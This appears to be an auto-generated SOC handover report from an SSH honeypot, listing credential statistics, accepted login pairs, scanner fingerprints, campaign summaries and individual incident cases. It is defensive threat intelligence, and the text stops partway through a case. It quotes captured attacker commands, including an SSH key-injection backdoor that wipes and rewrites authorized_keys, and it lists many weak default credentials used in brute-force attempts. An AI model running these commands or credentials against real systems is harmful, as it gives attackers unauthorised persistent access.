# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-26 |
| **Generated At** | 2026-07-26T23:03:53Z |
| **Shift Time** | 23:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **214** |
| Confirmed Threats | **191** |
| False Positives Filtered | **23** (10.8%) |
| Unique Attacker IPs | **73** |
| Countries of Origin | **23** |
| High Severity Cases | **144** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **70** |
| Malware Samples Analyzed | **4** HIGH · **29** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **162** |
| Unique Credential Pairs | **130** |
| Unique Usernames | **76** |
| Unique Passwords | **104** |
| Successful Auth Pairs | **153** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 28 |
| `support` | 9 |
| `ubuntu` | 8 |
| `centos` | 6 |
| `user` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 5 |
| `1234` | 5 |
| `support` | 4 |
| `pass` | 4 |
| `test00` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 4 |
| `oracle` | `pass` | 4 |
| `test` | `test00` | 4 |
| `support` | `222` | 4 |
| `ubnt` | `ubnt222` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `Root` | `letmein` | `61.12.86.90` | 2026-07-26T20:56:50 |
| `shahin` | `shahin` | `157.245.146.161` | 2026-07-26T20:56:53 |
| `support` | `support` | `176.53.159.196` | 2026-07-26T20:58:02 |
| `ubnt` | `ubnt222` | `111.17.213.162` | 2026-07-26T20:58:04 |
| `ubnt` | `ubnt222` | `10.0.0.73` | 2026-07-26T20:58:26 |
| `yasser` | `yasser` | `157.245.146.161` | 2026-07-26T20:59:55 |
| `oracle` | `pass` | `123.129.245.249` | 2026-07-26T21:01:26 |
| `oracle` | `pass` | `111.70.23.236` | 2026-07-26T21:01:35 |
| `abbas` | `abbas` | `157.245.146.161` | 2026-07-26T21:03:00 |
| `oracle` | `pass` | `58.34.174.90` | 2026-07-26T21:04:51 |
| `oracle` | `pass` | `10.0.0.73` | 2026-07-26T21:05:18 |
| `farzad` | `farzad` | `157.245.146.161` | 2026-07-26T21:06:00 |
| `emad` | `emad` | `157.245.146.161` | 2026-07-26T21:09:14 |
| `nasser` | `nasser` | `157.245.146.161` | 2026-07-26T21:12:26 |
| `amirhossein` | `amirhossein` | `157.245.146.161` | 2026-07-26T21:15:40 |
| `saeed` | `saeed` | `157.245.146.161` | 2026-07-26T21:18:43 |
| `postgres` | `uploader` | `10.0.0.73` | 2026-07-26T21:21:37 |
| `guest` | `guest666` | `61.145.181.7` | 2026-07-26T21:22:15 |
| `guest` | `guest666` | `213.230.64.246` | 2026-07-26T21:22:23 |
| `guest` | `guest666` | `10.0.0.73` | 2026-07-26T21:22:39 |
| `centos` | `3333333` | `187.115.144.103` | 2026-07-26T21:29:01 |
| `centos` | `3333333` | `122.160.142.194` | 2026-07-26T21:29:10 |
| `centos` | `3333333` | `10.0.0.73` | 2026-07-26T21:29:24 |
| `root` | `﻿------fuck------` | `169.58.9.58` | 2026-07-26T21:30:08 |
| `user` | `user77` | `124.152.90.68` | 2026-07-26T21:42:09 |
| `user` | `user77` | `203.192.211.180` | 2026-07-26T21:42:17 |
| `ubuntu` | `qwerty123456` | `45.181.101.95` | 2026-07-26T21:43:04 |
| `ubuntu` | `qwerty123456` | `202.138.229.190` | 2026-07-26T21:43:13 |
| `lisong` | `123456` | `103.51.216.200` | 2026-07-26T21:44:43 |
| `345gs5662d34` | `345gs5662d34` | `103.51.216.200` | 2026-07-26T21:44:47 |
| `lisong` | `3245gs5662d34` | `103.51.216.200` | 2026-07-26T21:44:48 |
| `user` | `user77` | `121.159.71.249` | 2026-07-26T21:45:20 |
| `ubuntu` | `qwerty123456` | `66.45.144.201` | 2026-07-26T21:46:12 |
| `root` | `---fuck_you----` | `120.26.71.134` | 2026-07-26T21:46:55 |
| `test` | `test00` | `117.226.48.35` | 2026-07-26T21:49:59 |
| `test` | `test00` | `188.43.204.45` | 2026-07-26T21:50:06 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-26T21:53:00 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-26T21:53:00 |
| `test` | `test00` | `218.58.73.238` | 2026-07-26T21:53:22 |
| `test` | `test00` | `74.208.177.56` | 2026-07-26T21:53:29 |
| `sol` | `sol` | `2.57.122.238` | 2026-07-26T21:59:55 |
| `solana` | `solana` | `2.57.122.238` | 2026-07-26T22:01:45 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-07-26T22:03:39 |
| `support` | `support` | `10.0.0.73` | 2026-07-26T22:03:57 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-07-26T22:05:37 |
| `ubnt` | `ubnt` | `94.154.43.30` | 2026-07-26T22:07:09 |
| `vyos` | `vyos` | `94.154.43.30` | 2026-07-26T22:07:12 |
| `centos` | `4` | `175.198.18.3` | 2026-07-26T22:07:13 |
| `root` | `` | `94.154.43.30` | 2026-07-26T22:07:18 |
| `admin` | `admin` | `94.154.43.30` | 2026-07-26T22:07:26 |
| `centos` | `4` | `49.124.149.20` | 2026-07-26T22:07:28 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-07-26T22:07:29 |
| `admin` | `pfsense` | `94.154.43.30` | 2026-07-26T22:07:31 |
| `root` | `opnsense` | `94.154.43.30` | 2026-07-26T22:07:36 |
| `root` | `admin` | `94.154.43.30` | 2026-07-26T22:07:39 |
| `admin` | `1234` | `94.154.43.30` | 2026-07-26T22:07:47 |
| `root` | `password` | `94.154.43.30` | 2026-07-26T22:07:51 |
| `root` | `abcd1234` | `94.154.43.30` | 2026-07-26T22:07:54 |
| `admin` | `moxa` | `94.154.43.30` | 2026-07-26T22:07:58 |
| `94jo3dkru4` | `moaxiwroot` | `94.154.43.30` | 2026-07-26T22:08:02 |
| `default` | `default` | `94.154.43.30` | 2026-07-26T22:08:05 |
| `raspberry` | `pi` | `94.154.43.30` | 2026-07-26T22:08:11 |
| `pi` | `raspberry` | `94.154.43.30` | 2026-07-26T22:08:15 |
| `freebsd` | `freebsd` | `94.154.43.30` | 2026-07-26T22:08:18 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-07-26T22:09:17 |
| `centos` | `4` | `10.0.0.73` | 2026-07-26T22:10:48 |
| `firedancer` | `firedancer` | `2.57.122.238` | 2026-07-26T22:11:07 |
| `node` | `node` | `2.57.122.238` | 2026-07-26T22:13:00 |
| `node` | `1234` | `2.57.122.238` | 2026-07-26T22:14:53 |
| `node` | `123456` | `2.57.122.238` | 2026-07-26T22:16:48 |
| `support` | `222` | `189.56.0.19` | 2026-07-26T22:17:25 |
| `support` | `222` | `119.200.229.33` | 2026-07-26T22:17:34 |
| `support` | `222` | `10.0.0.73` | 2026-07-26T22:17:41 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-07-26T22:18:46 |
| `eth` | `eth` | `2.57.122.238` | 2026-07-26T22:20:42 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-26T22:21:50 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-26T22:21:50 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-26T22:21:50 |
| `polygon` | `polygon` | `2.57.122.238` | 2026-07-26T22:22:30 |
| `tron` | `tron` | `2.57.122.238` | 2026-07-26T22:24:20 |
| `trx` | `trx` | `2.57.122.238` | 2026-07-26T22:26:16 |
| `validator` | `ethereum` | `2.57.122.238` | 2026-07-26T22:28:07 |
| `sepolia` | `sepolia` | `2.57.122.238` | 2026-07-26T22:30:00 |
| `avalanche` | `avalanche` | `2.57.122.238` | 2026-07-26T22:31:59 |
| `root` | `` | `94.154.43.158` | 2026-07-26T22:33:11 |
| `solv` | `solv` | `2.57.122.238` | 2026-07-26T22:33:43 |
| `test` | `55` | `10.0.0.73` | 2026-07-26T22:34:15 |
| `root` | `Password@123` | `10.0.0.73` | 2026-07-26T22:35:14 |
| `root` | `ssh-probe-0D278529DC1A2A5930BF47787E1173557DC4A226111A362D` | `10.0.0.73` | 2026-07-26T22:35:16 |
| `solv` | `1234` | `2.57.122.238` | 2026-07-26T22:35:18 |
| `rk` | `rk@123` | `4.206.92.183` | 2026-07-26T22:36:34 |
| `345gs5662d34` | `345gs5662d34` | `4.206.92.183` | 2026-07-26T22:36:35 |
| `rk` | `3245gs5662d34` | `4.206.92.183` | 2026-07-26T22:36:35 |
| `solv` | `123456` | `2.57.122.238` | 2026-07-26T22:36:53 |
| `solv` | `12345678` | `2.57.122.238` | 2026-07-26T22:38:33 |
| `blank` | `00000` | `10.0.0.73` | 2026-07-26T22:41:53 |
| `ubuntu` | `ubuntu` | `2.57.122.238` | 2026-07-26T22:43:17 |
| `validator` | `validator` | `2.57.122.238` | 2026-07-26T22:44:57 |
| `ubuntu` | `Password@123` | `10.0.0.73` | 2026-07-26T22:45:34 |
| `ubuntu` | `ssh-probe-1CD880A3F1B169DC05042A1023EF00B41B16D73ECCF0ABEA` | `10.0.0.73` | 2026-07-26T22:45:34 |
| `sol` | `sol123` | `2.57.122.238` | 2026-07-26T22:46:38 |
| `sol` | `123` | `2.57.122.238` | 2026-07-26T22:48:15 |
| `sol` | `12345678` | `2.57.122.238` | 2026-07-26T22:49:55 |
| `trading` | `trading` | `2.57.122.238` | 2026-07-26T22:51:33 |
| `root` | `1qaz@WSX` | `45.156.87.204` | 2026-07-26T22:52:01 |
| `airflow` | `airflow` | `45.156.87.204` | 2026-07-26T22:52:06 |
| `omm` | `omm` | `45.156.87.204` | 2026-07-26T22:52:10 |
| `root` | `abc123456` | `45.156.87.204` | 2026-07-26T22:52:14 |
| `jellyfin` | `123` | `45.156.87.204` | 2026-07-26T22:52:18 |
| `user3` | `1` | `45.156.87.204` | 2026-07-26T22:52:21 |
| `test1` | `test123` | `45.156.87.204` | 2026-07-26T22:52:25 |
| `gateway` | `gateway` | `45.156.87.204` | 2026-07-26T22:52:29 |
| `support` | `Passw0rd` | `45.156.87.204` | 2026-07-26T22:52:33 |
| `hadoop` | `hadoop123` | `45.156.87.204` | 2026-07-26T22:52:37 |
| `root` | `P@55w0rd` | `45.156.87.204` | 2026-07-26T22:52:40 |
| `deployer` | `deployer123` | `45.156.87.204` | 2026-07-26T22:52:44 |
| `root` | `rootroot` | `45.156.87.204` | 2026-07-26T22:52:48 |
| `botuser` | `123` | `45.156.87.204` | 2026-07-26T22:52:51 |
| `rdpuser` | `123456789` | `45.156.87.204` | 2026-07-26T22:52:55 |
| `openclaw` | `user` | `45.156.87.204` | 2026-07-26T22:52:59 |
| `root` | `helloworld` | `45.156.87.204` | 2026-07-26T22:53:03 |
| `ghost` | `ghost` | `45.156.87.204` | 2026-07-26T22:53:07 |
| `trader` | `trader` | `2.57.122.238` | 2026-07-26T22:53:09 |
| `deploy` | `user` | `45.156.87.204` | 2026-07-26T22:53:10 |
| `deploy` | `123456789` | `45.156.87.204` | 2026-07-26T22:53:14 |
| `root` | `1qazXSW@` | `45.156.87.204` | 2026-07-26T22:53:18 |
| `root` | `0987654321` | `45.156.87.204` | 2026-07-26T22:53:22 |
| `user` | `rootroot` | `45.156.87.204` | 2026-07-26T22:53:26 |
| `webuser` | `webuser` | `45.156.87.204` | 2026-07-26T22:53:29 |
| `root` | `Pass@123` | `45.156.87.204` | 2026-07-26T22:53:33 |
| `developer` | `dev` | `45.156.87.204` | 2026-07-26T22:53:37 |
| `rancher` | `rancher` | `45.156.87.204` | 2026-07-26T22:53:41 |
| `nobody` | `nobody` | `45.156.87.204` | 2026-07-26T22:53:44 |
| `newuser` | `123456` | `45.156.87.204` | 2026-07-26T22:53:48 |
| `azureuser` | `root` | `45.156.87.204` | 2026-07-26T22:53:52 |
| `admin123` | `1234` | `45.156.87.204` | 2026-07-26T22:53:56 |
| `admin` | `1` | `45.156.87.204` | 2026-07-26T22:54:00 |
| `root` | `Admin@123` | `45.156.87.204` | 2026-07-26T22:54:03 |
| `pi` | `12345678` | `45.156.87.204` | 2026-07-26T22:54:07 |
| `root` | `root12345` | `45.156.87.204` | 2026-07-26T22:54:11 |
| `ubuntu` | `rootroot` | `45.156.87.204` | 2026-07-26T22:54:15 |
| `user` | `111111` | `45.156.87.204` | 2026-07-26T22:54:19 |
| `ubuntu` | `1qaz@WSX` | `45.156.87.204` | 2026-07-26T22:54:23 |
| `main` | `1234` | `45.156.87.204` | 2026-07-26T22:54:27 |
| `prefect` | `prefect` | `45.156.87.204` | 2026-07-26T22:54:31 |
| `aaa` | `123456` | `45.156.87.204` | 2026-07-26T22:54:35 |
| `teamspeak` | `teamspeak` | `45.156.87.204` | 2026-07-26T22:54:39 |
| `deploy` | `rootroot` | `45.156.87.204` | 2026-07-26T22:54:43 |
| `tradingbot` | `tradingbot` | `2.57.122.238` | 2026-07-26T22:54:44 |
| `gitlab-runner` | `123` | `45.156.87.204` | 2026-07-26T22:54:46 |
| `clawdbot` | `clawdbot` | `45.156.87.204` | 2026-07-26T22:54:50 |
| `user` | `password` | `45.156.87.204` | 2026-07-26T22:54:54 |
| `root` | `QWEqwe123` | `45.156.87.204` | 2026-07-26T22:55:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **214** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 114 |
| OpenSSH | 23 |
| libssh | 14 |
| Paramiko (Python) | 6 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 56 | 3 |
| `0a07365cc01f...` | Generic scanner | 48 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 23 | 23 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 56 | 3 | Generic scanner |
| `0a07365cc01f...` | Go SSH scanner | 48 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 23 | 23 | Mirai/variant |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.158`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.51.216.200`, `4.206.92.183`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **73** |
| Unique ASNs | **50** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 7 | MEDIUM |
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (143)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-aa8802bb7d5e

| Field | Detail |
|---|---|
| **Source IP** | `61.12.86[.]90` |
| **First Seen** | 2026-07-26 20:56 |
| **Last Seen** | 2026-07-26 20:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 20:56:48` | `cowrie.session.connect` |
| `2026-07-26 20:56:48` | `cowrie.client.version` |
| `2026-07-26 20:56:48` | `cowrie.client.kex` |
| `2026-07-26 20:56:50` | `cowrie.login.success` |
| `2026-07-26 20:56:50` | `cowrie.direct-tcpip.request` |
| `2026-07-26 20:56:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.86[.]90` to AbuseIPDB if not already reported
- [ ] Block `61.12.86[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd1ba2cbf060

| Field | Detail |
|---|---|
| **Source IP** | `157.245.146[.]161` |
| **First Seen** | 2026-07-26 20:56 |
| **Last Seen** | 2026-07-26 20:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 20:56:52` | `cowrie.session.connect` |
| `2026-07-26 20:56:52` | `cowrie.client.version` |
| `2026-07-26 20:56:52` | `cowrie.client.kex` |
| `2026-07-26 20:56:53` | `cowrie.login.success` |
| `2026-07-26 20:56:54` | `cowrie.session.params` |
| `2026-07-26 20:56:54` | `cowrie.command.input` |
| `2026-07-26 20:56:54` | `cowrie.log.closed` |
| `2026-07-26 20:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.146[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.146[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9111488cfe3

| Field | Detail |
|---|---|
| **Source IP** | `111.17.213[.]162` |
| **First Seen** | 2026-07-26 20:58 |
| **Last Seen** | 2026-07-26 20:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 20:58:01` | `cowrie.session.connect` |
| `2026-07-26 20:58:01` | `cowrie.client.version` |
| `2026-07-26 20:58:01` | `cowrie.client.kex` |
| `2026-07-26 20:58:04` | `cowrie.login.success` |
| `2026-07-26 20:58:05` | `cowrie.direct-tcpip.request` |
| `2026-07-26 20:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.17.213[.]162` to AbuseIPDB if not already reported
- [ ] Block `111.17.213[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-787fd0eb35de

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 20:58 |
| **Last Seen** | 2026-07-26 20:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 20:58:01` | `cowrie.session.connect` |
| `2026-07-26 20:58:01` | `cowrie.client.version` |
| `2026-07-26 20:58:01` | `cowrie.client.kex` |
| `2026-07-26 20:58:02` | `cowrie.login.success` |
| `2026-07-26 20:58:02` | `cowrie.direct-tcpip.request` |
| `2026-07-26 20:58:02` | `cowrie.direct-tcpip.data` |
| `2026-07-26 20:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a125d757c25

| Field | Detail |
|---|---|
| **Source IP** | `157.245.146[.]161` |
| **First Seen** | 2026-07-26 20:59 |
| **Last Seen** | 2026-07-26 20:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 20:59:54` | `cowrie.session.connect` |
| `2026-07-26 20:59:54` | `cowrie.client.version` |
| `2026-07-26 20:59:54` | `cowrie.client.kex` |
| `2026-07-26 20:59:55` | `cowrie.login.success` |
| `2026-07-26 20:59:56` | `cowrie.session.params` |
| `2026-07-26 20:59:56` | `cowrie.command.input` |
| `2026-07-26 20:59:56` | `cowrie.log.closed` |
| `2026-07-26 20:59:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.146[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.146[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-459da36334a0

| Field | Detail |
|---|---|
| **Source IP** | `123.129.245[.]249` |
| **First Seen** | 2026-07-26 21:01 |
| **Last Seen** | 2026-07-26 21:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:01:24` | `cowrie.session.connect` |
| `2026-07-26 21:01:25` | `cowrie.client.version` |
| `2026-07-26 21:01:25` | `cowrie.client.kex` |
| `2026-07-26 21:01:26` | `cowrie.login.success` |
| `2026-07-26 21:01:27` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.129.245[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.129.245[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60f94535831a

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]236` |
| **First Seen** | 2026-07-26 21:01 |
| **Last Seen** | 2026-07-26 21:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:01:32` | `cowrie.session.connect` |
| `2026-07-26 21:01:33` | `cowrie.client.version` |
| `2026-07-26 21:01:33` | `cowrie.client.kex` |
| `2026-07-26 21:01:35` | `cowrie.login.success` |
| `2026-07-26 21:01:35` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]236` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da42a23019e6

| Field | Detail |
|---|---|
| **Source IP** | `157.245.146[.]161` |
| **First Seen** | 2026-07-26 21:02 |
| **Last Seen** | 2026-07-26 21:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:02:59` | `cowrie.session.connect` |
| `2026-07-26 21:02:59` | `cowrie.client.version` |
| `2026-07-26 21:02:59` | `cowrie.client.kex` |
| `2026-07-26 21:03:00` | `cowrie.login.success` |
| `2026-07-26 21:03:01` | `cowrie.session.params` |
| `2026-07-26 21:03:01` | `cowrie.command.input` |
| `2026-07-26 21:03:01` | `cowrie.log.closed` |
| `2026-07-26 21:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.146[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.146[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41cf14681e69

| Field | Detail |
|---|---|
| **Source IP** | `58.34.174[.]90` |
| **First Seen** | 2026-07-26 21:04 |
| **Last Seen** | 2026-07-26 21:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:04:49` | `cowrie.session.connect` |
| `2026-07-26 21:04:49` | `cowrie.client.version` |
| `2026-07-26 21:04:49` | `cowrie.client.kex` |
| `2026-07-26 21:04:51` | `cowrie.login.success` |
| `2026-07-26 21:04:52` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:04:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.34.174[.]90` to AbuseIPDB if not already reported
- [ ] Block `58.34.174[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58ca35bd8611

| Field | Detail |
|---|---|
| **Source IP** | `157.245.146[.]161` |
| **First Seen** | 2026-07-26 21:05 |
| **Last Seen** | 2026-07-26 21:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:05:59` | `cowrie.session.connect` |
| `2026-07-26 21:05:59` | `cowrie.client.version` |
| `2026-07-26 21:06:00` | `cowrie.client.kex` |
| `2026-07-26 21:06:00` | `cowrie.login.success` |
| `2026-07-26 21:06:01` | `cowrie.session.params` |
| `2026-07-26 21:06:01` | `cowrie.command.input` |
| `2026-07-26 21:06:02` | `cowrie.log.closed` |
| `2026-07-26 21:06:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.146[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.146[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3223569a54e6

| Field | Detail |
|---|---|
| **Source IP** | `157.245.146[.]161` |
| **First Seen** | 2026-07-26 21:09 |
| **Last Seen** | 2026-07-26 21:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
